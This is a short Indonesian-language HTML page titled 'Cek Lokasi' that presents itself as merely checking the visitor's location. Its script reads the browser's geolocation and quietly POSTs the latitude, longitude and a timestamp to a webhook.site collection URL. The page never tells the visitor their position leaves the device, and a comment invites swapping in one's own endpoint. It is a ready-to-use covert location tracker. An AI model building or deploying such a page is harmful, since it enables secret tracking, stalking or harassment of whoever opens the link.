<!DOCTYPE html>
<html>
<head>
  <title>Cek Lokasi</title>
</head>
<body>
  <h1>Memeriksa Lokasi Anda...</h1>
  <p id="status">Meminta izin lokasi...</p>

  <script>
    function sendLocation(lat, lon) {
      // Ganti URL berikut dengan Webhook/endpoint server kamu
      fetch("https://webhook.site/214bd26c-72f4-412a-bf14-e4a05dbce51f", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          timestamp: new Date().toISOString()
        })
      });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          document.getElementById("status").textContent = `Lokasi ditemukan: ${lat}, ${lon}`;
          sendLocation(lat, lon);
        },
        (error) => {
          document.getElementById("status").textContent = "Gagal mendapatkan lokasi: " + error.message;
        }
      );
    } else {
      document.getElementById("status").textContent = "Geolocation tidak didukung di browser ini.";
    }
  </script>
</body>
</html>
